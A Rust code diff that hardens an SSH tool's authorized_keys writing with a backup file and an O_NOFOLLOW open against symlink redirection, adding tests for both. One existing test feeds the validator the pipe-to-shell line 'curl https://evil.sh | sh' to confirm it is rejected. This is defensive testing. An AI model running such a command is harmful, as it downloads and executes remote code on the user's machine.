@@ -196,11 +196,49 @@ fn add_key(cfg: &Config, raw: &str) -> Result<Option<String>> {
     if text.lines().any(|l| l.trim() == key) {
         return Ok(None);
     }
+
+    // Keep one level of undo before the first change to the file.
+    if path.exists() {
+        let backup = path.with_extension("bak");
+        fs::copy(&path, &backup).with_context(|| format!("backing up {}", path.display()))?;
+        config::set_mode(&backup, 0o600)?;
+    }
+
     text.push_str(&key);
     text.push('\n');
-    fs::write(&path, text)?;
-    config::set_mode(&path, 0o600)?;
+    write_authorized_keys(&path, &text)?;
     Ok(Some(fingerprint))
+}
+
+/// Open with O_NOFOLLOW so a symlink swapped in after the check cannot redirect
+/// the write somewhere else.
+fn write_authorized_keys(path: &std::path::Path, text: &str) -> Result<()> {
+    use std::io::Write;
+
+    #[cfg(unix)]
+    let mut file = {
+        use std::os::unix::fs::OpenOptionsExt;
+        fs::OpenOptions::new()
+            .write(true)
+            .create(true)
+            .truncate(true)
+            .mode(0o600)
+            .custom_flags(libc::O_NOFOLLOW)
+            .open(path)
+            .with_context(|| format!("opening {} (symlinks are refused)", path.display()))?
+    };
+    #[cfg(not(unix))]
+    let mut file = fs::OpenOptions::new()
+        .write(true)
+        .create(true)
+        .truncate(true)
+        .open(path)
+        .with_context(|| format!("opening {}", path.display()))?;
+
+    file.write_all(text.as_bytes())?;
+    file.flush()?;
+    config::set_mode(path, 0o600)?;
+    Ok(())
 }
 
 fn ssh_block(cfg: &Config, identity: Option<&str>) -> String {
@@ -250,5 +288,47 @@ mod tests {
     #[test]
     fn rejects_no_key_at_all() {
         assert!(key_line("curl https://evil.sh | sh").is_err());
+    }
+}
+
+#[cfg(all(test, unix))]
+mod write_tests {
+    use super::write_authorized_keys;
+    use std::fs;
+
+    fn tmp(name: &str) -> std::path::PathBuf {
+        std::env::temp_dir().join(format!("ssh-tunnel-test-{}-{name}", std::process::id()))
+    }
+
+    #[test]
+    fn writes_and_chmods() {
+        let path = tmp("plain");
+        let _ = fs::remove_file(&path);
+        write_authorized_keys(&path, "ssh-ed25519 AAAA x\n").unwrap();
+        assert_eq!(fs::read_to_string(&path).unwrap(), "ssh-ed25519 AAAA x\n");
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            assert_eq!(
+                fs::metadata(&path).unwrap().permissions().mode() & 0o777,
+                0o600
+            );
+        }
+        fs::remove_file(&path).unwrap();
+    }
+
+    #[test]
+    fn refuses_a_symlink() {
+        let target = tmp("target");
+        let link = tmp("link");
+        let _ = fs::remove_file(&link);
+        fs::write(&target, "original\n").unwrap();
+        std::os::unix::fs::symlink(&target, &link).unwrap();
+
+        assert!(write_authorized_keys(&link, "pwned\n").is_err());
+        assert_eq!(fs::read_to_string(&target).unwrap(), "original\n");
+
+        fs::remove_file(&link).unwrap();
+        fs::remove_file(&target).unwrap();
     }
 }
